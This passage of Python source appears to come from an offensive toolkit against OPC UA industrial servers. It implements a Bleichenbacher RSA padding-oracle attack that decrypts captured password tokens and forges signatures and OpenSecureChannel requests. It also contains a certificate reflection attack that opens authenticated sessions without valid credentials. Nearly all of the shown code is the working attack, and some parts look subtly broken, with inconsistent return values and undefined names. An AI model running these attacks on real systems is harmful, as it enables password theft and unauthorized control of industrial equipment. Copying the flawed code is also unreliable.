        score += 1
      else:
        # Our Bleichenbacher attack can't deal with false negatives.
        return 0
    # elif padding_right:
    #   print(f'Missed {hexlify(int2bytes(plaintext, keylen))}')
  
  print(f'[*] Progress: [{"=" * 100}]', file=sys.stderr, flush=True)
  return score


def find_padding_oracle(url : str, try_opn : bool, try_password : bool) -> tuple[PaddingOracle, endpointDescription.Type]:
  # Try finding a working padding oracle against an endpoint.
  assert try_opn or try_password
  endpoints = get_endpoints(url)
  
  log(f'Checking {len(endpoints)} endpoints of {url} for RSA padding oracle.')
  
  possible_oracles = []
  if try_opn:
    possible_oracles.append(('OPN', OPNPaddingOracle))
  if try_password:
    possible_oracles.append(('Password', PasswordPaddingOracle))
  
  bestname, bestep, bestoracle, bestscore = None, None, None, 0
  for oname, oclass in possible_oracles:
    endpoint = oclass.pick_endpoint(endpoints)
    if endpoint:
      log(f'Endpoint "{endpoint.endpointUrl}" qualifies for {oname} oracle.')
      log(f'Trying a bunch of known plaintexts to assess its quality and reliability...')
      oracle = oclass(endpoint)
      try:
        quality = padding_oracle_quality(endpoint.serverCertificate, oracle)
        log(f'{oname} padding oracle score: {quality}/100')
        if quality == 100:
          log(f'Great! Let\'s use it.')
          return oracle
        elif quality > bestscore:
          bestname, bestep, bestoracle, bestscore = oname, endpoint, oracle, quality
          
      except ServerError as err:
        log(f'Got server error {hex(err.errorcode)}. Don\'t know how to interpret it. Skipping {oname} oracle.')
      except Exception as ex:
        log(f'Exception {type(ex).__name__} raised ("{ex}"). Skipping {oname} oracle.')
    else:
      log(f'None of the endpoints qualify for {oname} oracle.')

  if bestscore > 0:
    log(f'Continuing with {bestname} padding oracle for endpoint {bestep.endpointUrl}.')
    return bestoracle, bestep
  else:
    raise AttackNotPossible(f'Can\'t find exploitable padding oracle.')

def decrypt_attack(url : str, ciphertext : bytes, try_opn : bool, try_password : bool):
  # Use padding oracle to decrypt a ciphertext.
  # Logs the result, and also tries parsing it.
  
  oracle, endpoint = find_padding_oracle(url, try_opn, try_password)
  
  log(f'Running padding oracle attack...')
  result = rsa_decryptor(oracle, endpoint.serverCertificate, ciphertext)
  log_success(f'Success! Raw result: {hexlify(result).decode()}')
  
  # Check how plaintext is padded and display unpadded version.
  if result.startswith(b'\x00\x02') and b'\x00' not in result[2:9] and b'\x00' in result[10:]:
    log(f'Plaintext uses PKCS#1v1.5 padding. Unpadded value:')
    unpadded = result[(result[10:].find(b'\x00') + 11):]
  else:
    unpadded = decode_oaep_padding(result, 'sha1')
    if unpadded is not None:
      log('Plaintext uses OAEP padding (SHA-1 hash). Unpadded value:')
    else:
      unpadded = decode_oaep_padding(result, 'sha256')
      if unpadded is not None:
        log('Plaintext uses OAEP padding (SHA-256 hash). Unpadded value:')
  
  if unpadded is None:
    if result.startswith(b'\x00\x01'):
      log('Looks like the payload may be a signature instead of a ciphertext.')
    else:
      log('Result does not look like either PKCS#1v1.5 or OAEP padding. Maybe something went wrong?')
  else:
    log_success(hexlify(unpadded).decode())
    
    # Check if this looks like a password.
    try:
      lenval, tail = IntField().from_bytes(unpadded)
      if 32 <= lenval <= len(tail):
        pwd = tail[:lenval-32].decode('utf8')
        log('Looks like an encrypted UserIdentityToken with a password.')
        log_success(f'Password: {pwd}')
        return
    except:
      pass
      
    # Check if this looks like an OPN message.
    for msgtype in [openSecureChannelRequest, openSecureChannelResponse]:
      try:
        convo, _ = encodedConversation.from_bytes(unpadded)
        msg, _ = msgtype.from_bytes(convo.requestOrResponse)
        log('Looks like an OPN message:')
        log_success(f'{repr(msg)}')
        return
      except:
        pass
  
def int2bytes(value : int, outlen : int) -> bytes:
  # Coverts a nonnegative integer to a fixed-size big-endian binary representation.
  result = [0] * outlen
  j = value
  for ix in reversed(range(0, outlen)):
    result[ix] = j % 256
    j //= 256
    
  if j != 0:
    raise ValueError(f'{value} does not fit in {outlen} bytes.') 
  return bytes(result)


def forge_signature_attack(url : str, payload : bytes, try_opn : bool, try_password : bool, hasher : str) -> bytes:
  # Use padding oracle to forge an RSA PKCS#1 signature on some arbitrary payload.
  # Logs and returns signature.
  
  oracle, endpoint = find_padding_oracle(url, try_opn, try_password)
  
  # Compute padded hash to be used as 'ciphertext'.
  sigsize = certificate_publickey(endpoint.serverCertificate).size_in_bytes()
  padhash = pkcs1v15_signature_encode(hasher, payload, sigsize)
  log(f'Padded hash of payload: {hexlify(padhash).decode()}')
  log(f'Starting padding oracle attack...')
  sig = rsa_decryptor(oracle, endpoint.serverCertificate, padhash)
  log_success(f'Succes! Forged signature:')
  log_success(hexlify(sig).decode())
  return sig
  
def inject_cn_attack(url : str, cn : str, second_login : bool, demo : bool):  
  log(f'Attempting reflection attack against {url}')
  
  mycert, privkey = selfsign_cert(SELFSIGNED_CERT_TEMPLATE, cn, datetime.now() + timedelta(days=100))
  log(f'Generated self-signed certificate with CN {cn}.')
  log(f'SHA-1 thumbprint: {hexlify(certificate_thumbprint(mycert)).decode().upper()}')
  
  endpoints = get_endpoints(url)
  log(f'Server advertises {len(endpoints)} endpoints.')
  
  # Pick any with a non-None policy, preferably with None user authentication.
  # Also prefer TCP over HTTPS endpoint; shouldn't matter much for attack, but former is easier to sniff.
  ep = max(endpoints, key=lambda ep: [
    ep.securityPolicyUri != SecurityPolicy.NONE, 
    any(t.tokenType == UserTokenType.ANONYMOUS for t in ep.userIdentityTokens),
    ep.transportProfileUri.endswith('uatcp-uasc-uabinary'),
  ])
  if ep.securityPolicyUri == SecurityPolicy.NONE:
    raise AttackNotPossible('Server only supports None security policy.')
    
  def trylogin():
    try:
      proto, host, port = parse_endpoint_url(url)
      if proto == TransportProtocol.TCP_BINARY:
        sock = connect_and_hello(host, port)
        chan = authenticated_opn(sock, ep, mycert, privkey)
        log_success('Certificate was accepted during OPN handshake. Will now try to create a session with it.')
      else:
        assert proto == TransportProtocol.HTTPS
        chan = url
      
      createreply = generic_exchange(chan, ep.securityPolicyUri, createSessionRequest, createSessionResponse, 
        requestHeader=simple_requestheader(),
        clientDescription=applicationDescription.create(
          applicationUri=cn,
          productUri=cn,
          applicationName=LocalizedText(text=cn),
          applicationType=ApplicationType.CLIENT,
          gatewayServerUri=None,
          discoveryProfileUri=None,
          discoveryUrls=[],
        ),
        serverUri=ep.server.applicationUri,
        endpointUrl=ep.endpointUrl,
        sessionName=None,
        clientNonce=os.urandom(32),
        clientCertificate=mycert,
        requestedSessionTimeout=600000,
        maxResponseMessageSize=2**24,
      )
      log_success('CreateSessionRequest with certificate accepted.')
      anon_policies = [p for p in login_endpoint.userIdentityTokens if p.tokenType == UserTokenType.ANONYMOUS]
      if anon_policies:
        log('Trying to activate session.')
        activatereply = generic_exchange(chan, ep.securityPolicyUri, activateSessionRequest, activateSessionResponse, 
          requestHeader=simple_requestheader(createreply.authenticationToken),
          clientSignature=rsa_sign(ep.securityPolicyUri, privkey, ep.serverCertificate + createreply.serverNonce),
          clientSoftwareCertificates=[],
          localeIds=[],
          userIdentityToken=anonymousIdentityToken.create(policyId=anon_policies[0].policyId),
          userTokenSignature=signatureData.create(algorithm=None,signature=None),
        )
        log_success('Authentication with certificate was succesfull!')
        return chan, activatereply.authenticationToken
      else:
        log(f'Server requires user authentication, which is not implemented for this attack. Will stop here.')
        return None
    except ServerError as err:
      log(f'Login blocked. Server responsed with error {hex(err.errorcode)}.')
      return None      
        
  log(f'Trying to submit cert to endpoint {ep.endpointUrl}.')
  chantoken = trylogin()
  
  if not chantoken and second_login:
    log('Trying the second authentication attempt...')
    chantoken = trylogin()
    
  if chantoken and demo:
    demonstrate_access(*chantoken, ep.securityPolicyUri)
    

def forge_opn_request(endpoint : endpointDescription.Type, opn_oracle : bool, password_oracle : bool) -> OpenSecureChannelMessage:
  # Use the padding oracle attack to forge a (reusable) signed and encrypted OPN request.
  sp = endpoint.securityPolicyUri
  pk = certificate_publickey(endpoint.serverCertificate)
  assert sp != SecurityPolicy.NONE
  
  plaintext = encodedConversation.to_bytes(encodedConversation.create(
    sequenceNumber=1,
    requestId=1,
    requestOrResponse=openSecureChannelRequest.to_bytes(openSecureChannelRequest.create(
      requestHeader=simple_requestheader(),
      clientProtocolVersion=0,
      requestType=SecurityTokenRequestType.ISSUE,
      securityMode=endpoint.securityMode,
      clientNonce=SPOOFED_OPN_NONCE,
      requestedLifetime=3600000,
    ))
  ))
  msg = OpenSecureChannelMessage(
    secureChannelId=0,
    securityPolicyUri=sp,
    senderCertificate=client_certificate,
    receiverCertificateThumbprint=certificate_thumbprint(endpoint.serverCertificate),
    encodedPart=plaintext
  )
  padded_msg = pkcs7_pad(msg.to_bytes(), rsa_plainblocksize(sp, pk))
  
  log('First, trying sigforge attack to produce OPN signature.')
  hasher = 'sha1' if sp in [SecurityPolicy.BASIC128RSA15, SecurityPolicy.BASIC256] else 'sha256'
  forge_signature_attack(endpoint.endpointUrl, padded_msg, opn_oracle, password_oracle, hasher)
  
  msg.encodedPart = b''
  ciphertext = rsa_ecb_encrypt(sp, pk, padded_msg[len(msg.to_bytes()):] + signature)
  msg.encodedPart = ciphertext
  log(f'Message bytes after applying encryption: {hexlify(msg.to_bytes()).decode()}')
  
  return msg
  
# def bypass_opn(endpoint : endpointDescription.Type, opn_oracle : bool, password_oracle : bool) -> ChannelState:
#   # Attempts to set up a security channel without knowing the private key, by exploiting a padding oracle twice.
#   .....

    

def oracletest():  
  # Password token:
  todecrypt = unhexlify('9e82001c5a9b0d4ec8ed921af69659d8a3c8909bdb3be7bbf2f09a2321256deda98779fe8c182f476b06cf9592f2974b93a04fdbce82db34c2985c59ab71cce0f0987a35f2a4e0958411d40de4073ba00d223e5332ecaab0d5a850a1c97610cb2e42c7675d6a8eb3319ba95aabbed51014687bdf0edd417b47df2b4f348b6539ed1aa7bae5a4bd76ffe475a6d0ea54e51399996485c582615f55296411417f7c6db5aa8796653c47e503a00ce72a7e96e7c69ac52f5f200153cb585c6dc4119962ac004433da24f2347e75ee5fda60b507fde6c9197ad7f0aca65f3b6f91b51c8b0b501549aa10368ae7c4a2e2aeee1bb81bff8e3e6a9be7aa09b999ac641bc7')
  # First half of OPN request:
  # todecrypt = unhexlify('160dcd84074bc3ff604b383295132b658f9e8491c1dec934bc8e8bd5d8d3997a6ff1b1bdea125920c9e992d33c00a844dc4c6953d291468d1e306881ed37338e0990cef579f6673f1863232bb7e8c29717950d2424487d92dc7f95c8a89f91fa4b82d6bfbce8ecc3389697580db1e539f883f02cdddfc59382381cfe13e717d2571422558b2bf8d10337260cfa0b3ab42eb2bb6459dafcc47ebefa6a7e7236023a8f8ce2fb5b3553fedc2e7e5974a3e951e4afb5974e9ef44b094ebe9d7f52173bc5f0f10b6d93943a2f699349520b5ccde725650671ab4c54f8be66700d172f73513ddcd52e48f39111c884366d4a4aacdb213a6d6552c139d775a909b1e873')
  # Encryption of 0x00021234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567891234567890042:
  # todecrypt = unhexlify('af550d6983a8c885015af74701d4b0ef6f835ccc7fc71400e4347706d321d09f9a9fbfa5a55c7b2f781daa95d7c645ea94edbdd3652fe81279ff60a001675e0fea622afbc6ed36fe8b4b50e9d1a05caf37a209193ffe4131fff1f1e696e64af9b05af06f2bcc7313b022353ff2db984e3c473636aefa45c93ce8823297bc28eee9583f46eeaa8c23b57efdba0cbac4d1110c3d22a698f928c2974ee5a4048f26f57eb2a0d1755bfb0015f2668b4022eded7a26d544c351c7e12076579cb13a65ebfb71cff679780cab95e1bd1b8390fc28e6fb50f21ccbe86c6e213358bdee2996658b396a1a47326a7ec440e07283c6ca4308c1dec50379f90828599df7c7f5')
  
  ep = PasswordPaddingOracle.pick_endpoint(get_endpoints('opc.tcp://opc-testserver:62541/Quickstarts/ReferenceServer'))
  assert ep  
  
  oracle = PasswordPaddingOracle(ep)
  # print(repr(oracle.query(todecrypt)))
  # print(padding_oracle_quality(ep.serverCertificate, oracle)) 
  print(hexlify(rsa_decryptor(oracle, ep.serverCertificate, todecrypt)))
  

# if __name__ == '__main__':
#   oracletest()